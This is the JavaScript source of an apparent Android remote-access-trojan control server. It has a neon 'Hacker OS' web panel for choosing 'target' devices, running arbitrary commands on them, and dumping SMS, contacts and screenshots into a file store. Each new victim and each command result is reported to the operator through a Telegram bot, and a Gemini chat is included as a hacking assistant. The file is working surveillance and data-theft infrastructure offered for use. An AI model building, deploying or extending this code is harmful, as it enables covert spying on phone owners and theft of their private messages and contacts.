// index.js - Advanced Terminal Server + Telegram Bot + Gemini AI + Smart File Manager
require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const { GoogleGenerativeAI } = require('@google/generative-ai');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// --- File System Setup ---
const FILES_DIR = path.join(__dirname, 'file_manager_data');
if (!fs.existsSync(FILES_DIR)) {
    fs.mkdirSync(FILES_DIR, { recursive: true });
}

// --- Configuration ---
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    maxHttpBufferSize: 5e8 // 500MB buffer for large screenshots/APKs
});

// Middleware
app.use(cors());
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb', extended: true }));

// Initialize AI
const genAI = new GoogleGenerativeAI(process.env.GEMINI_API_KEY || '');

// Data Storage
const connectedDevices = new Map(); 
const pendingCommands = new Map(); 

// --- TELEGRAM LOGGER FUNCTION ---
async function sendTelegramLog(message) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) return;
    try {
        let text = message.length > 4000 ? message.substring(0, 3990) + "\n...[TRUNCATED]" : message;
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'HTML' })
        });
    } catch (err) {}
}

// --- Authentication Middleware ---
const authMiddleware = (req, res, next) => {
    const token = req.headers['authorization'] || req.query.token;
    if (process.env.AUTH_TOKEN && token !== process.env.AUTH_TOKEN) {
        return res.status(401).json({ error: 'Unauthorized: Invalid Token' });
    }
    next();
};

// ==================== WEB UI (NEON HACKER THEME V3) ====================
const webUIHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Advanced Hacker OS</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --neon: #00ff41; --bg: #0a0a0a; --panel: #111; --dark-green: #002200; --danger: #ff3333; --border: #004400; }
        * { box-sizing: border-box; margin: 0; padding: 0; scroll-behavior: smooth; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', Courier, monospace; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: var(--bg); }
        ::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 3px; }

        /* Navbar */
        nav { display: flex; background: var(--panel); border-bottom: 1px solid var(--neon); box-shadow: 0 2px 10px rgba(0,255,65,0.2); z-index: 10; }
        nav button { flex: 1; background: transparent; color: #444; border: none; padding: 15px 5px; font-size: 14px; cursor: pointer; text-transform: uppercase; font-weight: bold; transition: 0.3s; letter-spacing: 1px; }
        nav button.active { color: var(--bg); background: var(--neon); text-shadow: none; }
        nav button i { margin-right: 5px; }

        /* Main Container */
        .app-container { flex: 1; display: flex; flex-direction: column; overflow: hidden; padding: 10px; position: relative; }
        .tab-content { display: none; flex-direction: column; height: 100%; animation: fadeIn 0.3s ease-in-out; }
        .tab-content.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }

        /* General UI Elements */
        .top-bar { display: flex; gap: 8px; margin-bottom: 10px; flex-wrap: wrap; }
        input, select, button { background: var(--panel); color: var(--neon); border: 1px solid var(--border); padding: 12px; border-radius: 4px; font-family: inherit; font-size: 14px; outline: none; }
        input:focus, select:focus { border-color: var(--neon); box-shadow: 0 0 8px rgba(0,255,65,0.3); }
        .btn { background: var(--dark-green); cursor: pointer; font-weight: bold; text-transform: uppercase; border: 1px solid var(--neon); transition: 0.2s; }
        .btn:hover { background: var(--neon); color: var(--bg); box-shadow: 0 0 15px var(--neon); }
        .btn-danger { background: #200; border-color: var(--danger); color: var(--danger); }
        .btn-danger:hover { background: var(--danger); color: #fff; box-shadow: 0 0 15px var(--danger); }
        .flex-1 { flex: 1; min-width: 120px; }

        /* --- HOME TAB ENHANCEMENTS --- */
        .home-header { text-align: center; margin: 20px 0; padding-bottom: 20px; border-bottom: 1px dashed var(--border); }
        .home-header h1 { font-size: 1.8rem; text-shadow: 0 0 10px var(--neon); letter-spacing: 2px; margin-bottom: 5px; }
        .dashboard-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px; overflow-y: auto; padding-bottom: 20px; }
        .stat-card { background: linear-gradient(180deg, var(--panel), var(--bg)); border: 1px solid var(--border); padding: 20px 10px; text-align: center; border-radius: 6px; box-shadow: 0 4px 6px rgba(0,0,0,0.5); position: relative; overflow: hidden; }
        .stat-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--neon); box-shadow: 0 0 10px var(--neon); }
        .stat-card h3 { font-size: 2rem; margin-bottom: 5px; color: #fff; text-shadow: 0 0 8px var(--neon); }
        .stat-card p { font-size: 0.8rem; opacity: 0.8; text-transform: uppercase; }
        .quick-actions { margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap; }
        .quick-actions button { flex: 1; min-width: 48%; }

        /* --- TERMINAL TAB ENHANCEMENTS --- */
        #terminal-output { flex-grow: 1; background: #000; border: 1px solid var(--neon); border-radius: 4px; padding: 12px; overflow-y: auto; font-size: 13px; white-space: pre-wrap; word-break: break-word; margin-bottom: 10px; box-shadow: inset 0 0 20px rgba(0,255,65,0.1); line-height: 1.4; }
        .input-area { display: flex; align-items: center; background: var(--panel); border: 1px solid var(--neon); border-radius: 4px; padding: 2px 5px; box-shadow: 0 0 10px rgba(0,255,65,0.1); }
        .prompt { color: #fff; font-weight: bold; padding-right: 8px; border-right: 1px solid var(--border); margin-right: 8px; font-size: 13px; }
        #cmdInput { border: none; background: transparent; flex-grow: 1; box-shadow: none; padding: 12px 5px; color: var(--neon); }
        #cmdInput::placeholder { color: #005500; }

        /* --- FILE MANAGER TAB ENHANCEMENTS --- */
        .file-list { flex-grow: 1; overflow-y: auto; border: 1px solid var(--border); background: var(--panel); border-radius: 4px; }
        .file-item { display: flex; justify-content: space-between; align-items: center; padding: 12px; border-bottom: 1px solid var(--border); transition: background 0.2s; }
        .file-item:hover { background: rgba(0, 255, 65, 0.1); }
        .file-info { display: flex; align-items: center; gap: 12px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
        .file-info i { font-size: 18px; width: 20px; text-align: center; }
        .file-info span { font-size: 13px; }
        .file-actions { display: flex; gap: 6px; }
        .file-actions button { padding: 8px 10px; font-size: 12px; }

        /* Colors for Terminal Logs */
        .log-error { color: #ff5555; } .log-success { color: #55ff55; } .log-cmd { color: #00aaff; } .log-ai { color: #ffff55; } .log-sys { color: #888; }

        @media (max-width: 600px) {
            nav button { font-size: 12px; padding: 12px 2px; }
            .home-header h1 { font-size: 1.4rem; }
            .input-area { flex-wrap: wrap; }
            .prompt { border-right: none; border-bottom: 1px dashed var(--border); width: 100%; text-align: center; padding: 5px 0; margin: 0; }
            #cmdInput { width: 100%; text-align: center; }
            .file-item { flex-direction: column; align-items: stretch; gap: 8px; }
            .file-actions { justify-content: space-between; }
            .file-actions button { flex: 1; }
        }
    </style>
</head>
<body>

    <nav>
        <button id="nav-home" class="active" onclick="switchTab('home')"><i class="fas fa-home"></i> Home</button>
        <button id="nav-terminal" onclick="switchTab('terminal')"><i class="fas fa-terminal"></i> Terminal</button>
        <button id="nav-files" onclick="switchTab('files')"><i class="fas fa-folder-open"></i> Files</button>
    </nav>

    <div class="app-container">
        
        <div class="top-bar">
            <input type="password" id="authToken" class="flex-1" placeholder="Auth Token (Auto-saved)">
            <select id="deviceSelect" class="flex-1">
                <option value="">Select Target Device...</option>
            </select>
            <button class="btn" onclick="loadDevices()" title="Refresh Devices"><i class="fas fa-sync-alt"></i></button>
        </div>

        <div id="tab-home" class="tab-content active">
            <div class="home-header">
                <h1>⚡ NEON SYSTEM CORE ⚡</h1>
                <p style="color:#008800; font-size:12px;">Secure connection established.</p>
            </div>
            
            <div class="dashboard-grid">
                <div class="stat-card">
                    <h3 id="stat-devices">0</h3>
                    <p>Active Devices</p>
                </div>
                <div class="stat-card">
                    <h3 id="stat-files">0</h3>
                    <p>Saved Files</p>
                </div>
                <div class="stat-card">
                    <h3 style="color:#00aaff">ONLINE</h3>
                    <p>Server Status</p>
                </div>
            </div>

            <h4 style="margin: 15px 0 5px; color:#555; text-transform:uppercase;">Quick Execution</h4>
            <div class="quick-actions">
                <button class="btn" onclick="quickCmd('ls')"><i class="fas fa-list"></i> List Dir</button>
                <button class="btn" onclick="quickCmd('sms > sms_dump.txt')"><i class="fas fa-envelope"></i> Get SMS</button>
                <button class="btn" onclick="quickCmd('contact > contacts.json')"><i class="fas fa-address-book"></i> Contacts</button>
                <button class="btn" onclick="quickCmd('screenshot > screen.png')"><i class="fas fa-camera"></i> Screenshot</button>
            </div>
        </div>

        <div id="tab-terminal" class="tab-content">
            <div id="terminal-output">
<span class="log-sys">==============================================
 SYSTEM INITIALIZED... READY FOR COMMANDS.
==============================================</span>
<span class="log-sys">Tip: Use 'cmd > filename.txt' or 'screenshot > photo.png' to auto-save output to File Manager.</span>
</div>
            <div class="input-area">
                <span class="prompt" id="prompt-text">root@device:~#</span>
                <input type="text" id="cmdInput" placeholder="Enter command or 'ai <query>'..." onkeypress="if(event.key === 'Enter') processInput()" autocomplete="off">
                <button class="btn" onclick="processInput()" style="margin-left:5px;"><i class="fas fa-chevron-right"></i></button>
            </div>
        </div>

        <div id="tab-files" class="tab-content">
            <div class="top-bar" style="margin-bottom: 5px;">
                <button class="btn flex-1" onclick="loadFiles()"><i class="fas fa-sync"></i> Refresh Data</button>
            </div>
            <div class="file-list" id="fileList">
                <div style="padding:15px; text-align:center; color:#555;">Loading files...</div>
            </div>
        </div>

    </div>

    <script>
        const term = document.getElementById('terminal-output');
        const tokenInput = document.getElementById('authToken');
        const deviceSelect = document.getElementById('deviceSelect');

        window.onload = () => {
            const savedToken = localStorage.getItem('hackerToken');
            if (savedToken) {
                tokenInput.value = savedToken;
                setTimeout(() => { loadDevices(); loadFiles(); }, 500);
            }
        };

        deviceSelect.addEventListener('change', () => {
            const val = deviceSelect.value;
            document.getElementById('prompt-text').innerText = val ? \`root@\${val.substring(0,5)}:~#\` : 'root@system:~#';
        });

        function switchTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            document.querySelectorAll('nav button').forEach(el => el.classList.remove('active'));
            document.getElementById('tab-' + tabId).classList.add('active');
            document.getElementById('nav-' + tabId).classList.add('active');
            if(tabId === 'files') loadFiles();
            if(tabId === 'home') loadFiles(true); // silent refresh for stats
        }

        // Auto Smooth Scroll
        function log(msg, type = 'normal') {
            const div = document.createElement('div');
            div.className = 'log-' + type;
            div.innerHTML = msg.replace(/\\n/g, '<br>');
            term.appendChild(div);
            // Smooth scroll to bottom
            term.scrollTo({ top: term.scrollHeight, behavior: 'smooth' });
        }

        async function fetchAPI(endpoint, options = {}) {
            const token = tokenInput.value;
            if (token) localStorage.setItem('hackerToken', token);
            const headers = { 'Authorization': token, ...options.headers };
            const res = await fetch(endpoint, { ...options, headers });
            const data = await res.json();
            if (!res.ok || !data.success) throw new Error(data.error || 'Request failed');
            return data;
        }

        async function loadDevices() {
            try {
                const data = await fetchAPI('/api/devices');
                const prevVal = deviceSelect.value;
                deviceSelect.innerHTML = '<option value="">Select Target Device...</option>';
                data.devices.forEach(d => {
                    deviceSelect.innerHTML += \`<option value="\${d.id}">\${d.model} (\${d.id})</option>\`;
                });
                if(prevVal) deviceSelect.value = prevVal; // preserve selection
                document.getElementById('stat-devices').innerText = data.devices.length;
            } catch (err) { console.error(err); }
        }

        function quickCmd(cmd) {
            switchTab('terminal');
            document.getElementById('cmdInput').value = cmd;
            processInput();
        }

        async function processInput() {
            const deviceId = deviceSelect.value;
            const cmdInput = document.getElementById('cmdInput');
            let input = cmdInput.value.trim();
            if (!input) return;
            cmdInput.value = '';

            if (input.startsWith('ai ')) {
                log('> ' + input, 'cmd');
                try {
                    const data = await fetchAPI('/api/ai/chat', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ prompt: input.replace('ai ', '') }) });
                    log('🤖 ' + data.response, 'ai');
                } catch(e) { log('[!] AI Error: ' + e.message, 'error'); }
                return;
            }

            if (!deviceId) return log('[!] Target device not selected.', 'error');

            let saveAs = null;
            if (input.includes(' > ')) {
                const parts = input.split(' > ');
                input = parts[0].trim();
                saveAs = parts[1].trim();
            }

            log('> ' + input + (saveAs ? \` <span style="color:#888;">(Redirecting output to \${saveAs}...)</span>\` : ''), 'cmd');
            
            try {
                const data = await fetchAPI('/api/command/' + deviceId, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: input, saveAs: saveAs })
                });
                
                if(data.savedToFile) {
                    log(\`[✔] Success: Output saved in File Manager as <b>\${saveAs}</b>\`, 'success');
                } else {
                    let out = typeof data.result === 'object' ? JSON.stringify(data.result, null, 2) : data.result;
                    log(out || '[Execution complete. No output.]', 'success');
                }
            } catch (err) { log('[!] Failed: ' + err.message, 'error'); }
        }

        // --- FILE MANAGER CONTROLS ---
        function getFileIcon(filename) {
            const ext = filename.split('.').pop().toLowerCase();
            if(['png','jpg','jpeg'].includes(ext)) return { icon: 'fa-image', color: '#00aaff' };
            if(['apk'].includes(ext)) return { icon: 'fa-android', color: '#a4c639' };
            if(['json'].includes(ext)) return { icon: 'fa-file-code', color: '#ffff55' };
            if(['mp4','mp3','wav'].includes(ext)) return { icon: 'fa-photo-video', color: '#ff55aa' };
            return { icon: 'fa-file-alt', color: '#00ff41' };
        }

        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024, sizes = ['B', 'KB', 'MB', 'GB'], i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
        }

        async function loadFiles(silent = false) {
            const list = document.getElementById('fileList');
            if(!silent) list.innerHTML = '<div style="padding:15px; text-align:center;">Scanning system...</div>';
            try {
                const data = await fetchAPI('/api/files');
                document.getElementById('stat-files').innerText = data.files.length;
                
                if(silent) return; // Only update stats if silent

                list.innerHTML = '';
                if(data.files.length === 0) return list.innerHTML = '<div style="padding:20px; text-align:center; color:#555;">No files found.<br>Use <b>command > name.txt</b> in terminal to save data.</div>';
                
                // Sort by newest first
                data.files.sort((a,b) => b.mtime - a.mtime).forEach(f => {
                    const iconData = getFileIcon(f.name);
                    list.innerHTML += \`
                        <div class="file-item">
                            <div class="file-info" title="\${f.name}">
                                <i class="fas \${iconData.icon}" style="color: \${iconData.color};"></i> 
                                <span>\${f.name} <br><small style="color:#555">\${formatBytes(f.size)}</small></span>
                            </div>
                            <div class="file-actions">
                                <button class="btn" onclick="viewFile('\${f.name}')" title="View/Download"><i class="fas fa-eye"></i></button>
                                <button class="btn btn-danger" onclick="deleteFile('\${f.name}')"><i class="fas fa-trash"></i></button>
                            </div>
                        </div>
                    \`;
                });
            } catch(e) { if(!silent) list.innerHTML = '<div class="log-error" style="padding:15px">Error: ' + e.message + '</div>'; }
        }

        function viewFile(name) {
            const token = tokenInput.value;
            // Open in new tab. Browser will render images/txt, or prompt download for APKs.
            window.open(\`/api/files/download/\${name}?token=\${token}\`, '_blank');
        }

        async function deleteFile(name) {
            if(!confirm('Permanently delete ' + name + '?')) return;
            try {
                await fetchAPI('/api/files/delete/' + name, { method: 'DELETE' });
                loadFiles(); 
            } catch(e) { alert('Delete failed: ' + e.message); }
        }
    </script>
</body>
</html>
`;

app.get('/', (req, res) => res.send(webUIHTML));

// ==================== REST API ENDPOINTS ====================

app.get('/api/devices', authMiddleware, (req, res) => {
    try {
        const devices = Array.from(connectedDevices.values()).map(d => ({
            id: d.socket.deviceId,
            model: d.deviceInfo?.model || 'Android Target',
        }));
        res.json({ success: true, devices });
    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

app.post('/api/ai/chat', authMiddleware, async (req, res) => {
    try {
        if(!process.env.GEMINI_API_KEY) throw new Error("Gemini Key missing.");
        const model = genAI.getGenerativeModel({ model: 'gemini-1.5-flash' });
        const result = await model.generateContent("Context: Hacker OS Terminal. User: " + req.body.prompt);
        res.json({ success: true, response: result.response.text() });
    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

// --- SMART COMMAND EXECUTION & FILE SAVING ---
app.post('/api/command/:deviceId', authMiddleware, async (req, res) => {
    const { deviceId } = req.params;
    const { command, saveAs } = req.body;

    const device = connectedDevices.get(deviceId);
    if (!device) return res.status(404).json({ success: false, error: 'Device offline' });

    const requestId = Date.now() + '-' + uuidv4().substring(0,6);
    const commandPromise = new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
            pendingCommands.delete(requestId);
            reject(new Error('Device timed out (No response in 60s)'));
        }, 60000); 
        pendingCommands.set(requestId, { resolve, reject, timer, command, deviceId }); 
    });

    try {
        device.socket.emit('execute_command', { requestId, command });
        let result = await commandPromise;

        // --- SMART FILE SAVER (Handles Text, JSON, and Base64 Images/APKs) ---
        if (saveAs) {
            const safeName = path.basename(saveAs); 
            const filePath = path.join(FILES_DIR, safeName);
            
            // Determine if target file is binary based on extension
            const isBinaryTarget = safeName.match(/\\.(png|jpg|jpeg|apk|mp4)$/i);

            if (isBinaryTarget && typeof result === 'string') {
                // If the app sends a Base64 string (with or without data URI prefix)
                let base64Data = result.replace(/^data:.*?;base64,/, ""); 
                
                // Validate if it actually looks like base64
                if (/^[A-Za-z0-9+/=\\s]+$/.test(base64Data)) {
                    fs.writeFileSync(filePath, Buffer.from(base64Data, 'base64'));
                } else {
                    // Fallback: write as is if it's not base64
                    fs.writeFileSync(filePath, result);
                }
            } else {
                // Handle Text/JSON data (SMS, Contacts, Call logs)
                let dataToWrite = typeof result === 'object' ? JSON.stringify(result, null, 2) : String(result);
                fs.writeFileSync(filePath, dataToWrite, 'utf8');
            }
            
            return res.json({ success: true, requestId, savedToFile: true, file: safeName });
        }

        res.json({ success: true, requestId, result });
    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

// --- FILE MANAGER ROUTES ---
app.get('/api/files', authMiddleware, (req, res) => {
    try {
        const files = fs.readdirSync(FILES_DIR).map(name => {
            const stats = fs.statSync(path.join(FILES_DIR, name));
            return { name, size: stats.size, mtime: stats.mtimeMs }; // Send modification time for sorting
        });
        res.json({ success: true, files });
    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

app.get('/api/files/download/:name', authMiddleware, (req, res) => {
    try {
        const safeName = path.basename(req.params.name);
        const filePath = path.join(FILES_DIR, safeName);
        if (fs.existsSync(filePath)) {
            res.sendFile(filePath); // sendFile allows browser to preview images/text natively
        } else {
            res.status(404).send('File missing or deleted.');
        }
    } catch (error) { res.status(500).send('System Error.'); }
});

app.delete('/api/files/delete/:name', authMiddleware, (req, res) => {
    try {
        const safeName = path.basename(req.params.name);
        const filePath = path.join(FILES_DIR, safeName);
        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
            res.json({ success: true });
        } else {
            res.status(404).json({ success: false, error: 'File not found' });
        }
    } catch (error) { res.status(500).json({ success: false, error: error.message }); }
});

// ==================== SOCKET.IO HANDLERS ====================
io.on('connection', (socket) => {
    socket.on('register_device', async (data) => {
        const { deviceId, deviceInfo } = data;
        if (!deviceId) return;

        socket.deviceId = deviceId;
        socket.deviceInfo = deviceInfo || { model: 'Unknown' };

        connectedDevices.set(deviceId, { socket, deviceInfo });
        socket.join('device:' + deviceId);

        await sendTelegramLog("📱 <b>Target Locked!</b>\\nID: " + deviceId + "\\nModel: " + socket.deviceInfo.model);
        socket.emit('registered', { success: true });
    });

    socket.on('command_response', async (data) => {
        const { requestId, success, result, error } = data;
        const pending = pendingCommands.get(requestId);

        if (pending) {
            clearTimeout(pending.timer);
            pendingCommands.delete(requestId);

            // Small telegram log to prevent big payload crash
            let strRes = typeof result === 'object' ? JSON.stringify(result).substring(0, 100) : String(result).substring(0, 100);
            let tgMsg = success 
                ? "✅ <b>Cmd Success</b>\\nDevice: " + pending.deviceId + "\\nCmd: " + pending.command + "\\nResponse: " + strRes + "..."
                : "❌ <b>Cmd Failed</b>\\nDevice: " + pending.deviceId + "\\nError: " + error;

            await sendTelegramLog(tgMsg);

            if (success) pending.resolve(result);
            else pending.reject(new Error(error || 'Execution failed on target.'));
        }
    });

    socket.on('disconnect', async () => {
        if (socket.deviceId) {
            connectedDevices.delete(socket.deviceId);
            await sendTelegramLog("⚠️ <b>Connection Lost</b>\\nID: " + socket.deviceId);
        }
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log("🚀 Advanced OS Server Live on Port " + PORT);
});
